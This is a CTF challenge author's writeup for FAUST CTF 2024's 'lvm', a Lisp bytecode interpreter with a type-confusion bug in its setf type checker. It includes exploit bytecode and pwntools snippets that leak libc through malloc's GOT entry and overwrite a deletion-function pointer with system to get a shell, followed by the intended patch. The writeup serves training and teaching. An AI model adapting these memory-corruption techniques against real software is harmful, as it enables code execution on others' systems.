---
title: "lvm - FAUST CTF 2024"
category: "pwn"
subcategory: "vm"
type: "writeup"
tags: ["pwn", "binary-exploitation", "type-confusion", "custom-vm", "lvm", "vm", "faust-ctf", "faust-ctf-2024", "2024", "ctf-writeup"]
summary: "Hi, this is the challenge author."
source:
  name: "CTFtime writeup #39538"
  url: "https://ctftime.org/writeup/39538"
ctf:
  name: "FAUST CTF 2024"
  year: 2024
  challenge: "lvm"
---

## Metadata

- **CTF:** FAUST CTF 2024
- **Task:** lvm
- **Author team:** FAUST
- **CTFtime tags:** binary-exploitation, type-confusion
- **CTFtime:** <https://ctftime.org/writeup/39538>

---
## Author's writeup  
Hi, this is the challenge author. I'm posting my own writeup, because nobody solved the challenge during the CTF (although some teams were really close).

### About the service  
This challenge is a basic bytecode interpreter with typed instructions. The name `lvm` is obviously a reference to the `JVM` (the Java Virtual Machine) as this challenge was heavily inspired by how the JVM works.

In the JVM, whenever you load a class file, the runtime first checks that your program is well-formed, e.g. all instructions operate on the correct types. As said earlier, the instructions require their operands to be of a specific type. For a list of JVM instructions, see [here](<https://docs.oracle.com/javase/specs/jvms/se7/html/jvms-6.html>).

Similarly in lvm, the instructions operate on lisp's basic types, that is: string, symbol, number, cons-cell. If you don't know lisp then symbol is just a "special form of string" used for string comparison (two symbols of the same value always have the same pointer), and a cons-cell can hold two other lisp values. Think of a linked list with `head` and `tail`, in lisp this is called [`car` and `cdr`](<https://en.wikipedia.org/wiki/CAR_and_CDR>) instead. While a cons-cell is mostly used for linked lists, it doesn't have to, the contents can be arbitrary lisp values. It is also often used as a tuple holding two elements.

So, the service allows you to execute arbitrary lisp bytecode files. If you try to run such a file, the interpreter will first check whether your program is well-formed:  
* Checking all instruction arguments. LVM is a stackbased architecture and therefore the operations operate on the value stack.  
E.g. the `ADD` instructions takes the two topmost arguments of type number, adds them and pushes another number on the stack.  
So, if the interpreter encounters an `ADD` instruction, it must check that the stack has at least two values and that both of them are numbers.  
* Jump instructions. If the interpreter encounters a jump instruction, the target of the jump must have a compatible stack. That is, all operations that occur after the jump still have to typecheck and the stack must be of the same size. That prohibits us from doing something like this: `(print (if <cond> "foo" 123))`, as this would evaluate to a string in the true case and a number in the false case.  
Why do we have to compare stacks then, can't we just continue typechecking from the jump target? We need to remember previously evaluated stacks to prevent infinite loops, e.g. during a while-loop as we would always have to jump to the start of the block whenever we finished evaluating the loop (as the next iteration must be compatible with our stack as well!)

If the input is well-formed, then we can just execute all instructions without doing any run-time type checking.

The service was given without any source code, only the binary itself. However, for better understanding I will show bits of the source code in this writeup instead of decompiler output.

### Vulnerability  
The type-checker contains a bug. The `setf` instruction has this code for type checking:  
```c  
CHECK_STACK(ins.stackref + 1);  
stack[stackcount - 2 - ins.stackref] = stack[stackcount - 1];  
```

`CHECK_STACK` is a macro to check whether there are enough values on the stack. Bear in mind, thath the `stack` in this case refers to the type-checking stack and not the runtime value-stack.

So, what does `setf` actually do? In lisp `setf` can be used to set a value "in-place", e.g. `(setf (cdr list) "foo")` would replace the tail of the list `list` with our string `"foo"`.

In lvm, we fake this by replacing the lisp-value itself. On a side-note, this mostly works but is not the same as a real lisp implementation would behave. For example in lvm `(setf nil t)` would kinda break your whole program, while in a normal lisp this won't do anything.

If we come back to the code above, what the type checker is now doing is replace the type of the target on the stack with the type of the argument. On first glance, this seems correct as we are indeed replacing the target with the top of the stack. However, the target may appear multiple times on the stack and the other references are still tagged with the old type, leading to a type confusion vulnerability.

### Exploit  
Using the type confusion, we can leak an arbitrary address:  
```  
0002: CONSTANT ""  
0004: DUP 0  
0005: READ  
0006: SETF 0  
0007: POP 2  
0008: PRINT  
0009: POP 1  
```

What we do here is push an arbitrary string on the stack, duplicating it and replace the copy with a number that points to the address we want to leak. As the original value is still tagged as a string, we can just call print and our number will be interpreted as a `char*` instead. LVM only uses doubles as numbers, no integers. Therefore you must load a number, whose bit-representation is a valid pointer.  
I've written a small helper function that does this for me:  
```python  
def doublify(target):  
return f'{struct.unpack("d", p64(target))[0]:.1000}'.encode()  
```

In my exploit, I just leak the got-entry of `malloc` so that I can compute the libc base address:  
```python  
p.sendline(doublify(binary.got['malloc']))  
leak = u64(p.recvline()[:-1].ljust(8, b'\x00'))

libc.address = leak - libc.sym['malloc']  
[log.info](http://log.info)(f'libc @ 0x{libc.address:x}')  
```

The next step would be to replace a pointer with something that pops us a shell. So, what is our write target? Luckily for us, the cleanup is done by indexing an array of free functions:  
```c

void (*deletion_function[9])(union VariantData) = {  
[TYPE_CONS] = delete_noop,  
[TYPE_NUMBER] = delete_noop,  
[TYPE_STRING] = delete_string,  
[TYPE_SYMBOL] = delete_symbol,  
};

static void delete_variant(struct Variant *v) {  
deletion_function[v->type](v->data);  
free(v);  
}  
```

So, we can just overwrite the entry of `TYPE_STRING` with `system`, as the compiler already put the `char*` into register `rdi`.

To write to an arbitrary address, we can use:  
```  
000a: NIL  
000b: T  
000c: CONS  
000d: DUP 0  
000e: READ  
000f: SETF 0  
0010: POP 2  
0011: CAR  
0012: READ  
0013: SETF 0  
0014: POP 2  
```

What this does is use the type confusion on a cons-cell instead of a string as before. This enables us to read a pointer from the first slot using `car`. This value does not point to any lisp type anymore, but to our arbitrary target address. With another `setf`, we can thus overwrite the contents of that address with an arbitrary lisp value. As the lisp value contains a number holding the runtime type as the first struct field, we actually need to write 8 bytes before our target address:  
```python  
TYPE_STRING = (1 << 3)  
p.sendline(doublify(binary.symbols['deletion_function'] + TYPE_STRING * 8 - 8))  
p.sendline(doublify(libc.symbols['system']))  
```

Last, we need a `"/bin/sh"` string on the stack that is "freed" on exit, and we need to return so that the program exits (and our exploit is triggered). In total, this becomes:  
```  
0000: CONSTANT "/bin/sh"

// leak arbitrary address  
0002: CONSTANT ""  
0004: DUP 0  
0005: READ  
0006: SETF 0  
0007: POP 2  
0008: PRINT  
0009: POP 1

// write arbitrary address  
000a: NIL  
000b: T  
000c: CONS  
000d: DUP 0  
000e: READ  
000f: SETF 0  
0010: POP 2  
0011: CAR  
0012: READ  
0013: SETF 0  
0014: POP 2  
0015: RET 0  
```  
### Intended Patch  
We can just patch `setf`, to erase any typing information on the stack, as the interpreter cannot know which of these types actually refer to the same value.
